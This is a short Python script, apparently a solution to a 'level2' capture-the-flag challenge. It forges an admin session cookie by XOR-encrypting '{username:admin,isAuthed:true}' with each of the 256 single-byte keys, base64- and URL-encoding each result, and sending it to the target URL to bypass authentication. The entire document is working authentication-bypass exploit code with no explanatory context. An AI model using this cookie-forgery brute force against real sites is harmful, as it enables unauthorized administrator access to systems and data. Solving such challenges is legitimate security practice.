
import requests
import base64
import urllib

url = "https://006a638569325dd6a191af7e625ed10b-netadmin.web.cityinthe.cloud/level2"
to_encode = '{"username":"admin","isAuthed":true}'

for x in range(256):
  xored = bytes(''.join(chr(ord(a) ^ x) for a in to_encode), 'utf-8')
  base64d = base64.b64encode(xored)
  print(base64d)
  urlencoded = urllib.parse.quote(base64d)
  print(urlencoded)
  cookie = dict(level2session=urlencoded)
  print(cookie)
  r = requests.get(url, cookies=cookie)
  print(r.text)